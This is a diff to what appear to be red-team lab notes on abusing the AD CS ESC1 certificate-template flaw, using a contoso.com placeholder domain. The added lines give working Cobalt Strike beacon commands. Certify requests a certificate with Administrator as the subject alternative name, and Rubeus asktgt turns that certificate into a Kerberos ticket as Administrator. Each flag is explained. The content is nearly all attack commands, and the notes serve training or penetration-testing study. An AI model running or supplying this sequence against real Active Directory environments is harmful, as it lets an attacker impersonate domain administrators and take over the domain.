@@ -11,3 +11,11 @@ ESC1 vulnerability:
     enumeration for this vuln:
         beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
             we're looking for the ENROLLEE_SUPPLIES_SUBJECT flag, client auth in the extended key usage
+    exploitation:
+        beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
+            where...
+                --ca is the target CA for the cert req
+                --template is the cert template to request 
+                --upn is the user we want to impersonate, aka subjet alternate name for the cert req
+        this will produce a base64 encoded cert in PFX format, which can use with asktgt
+            beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[cert] /enctype:aes256 /nowrap
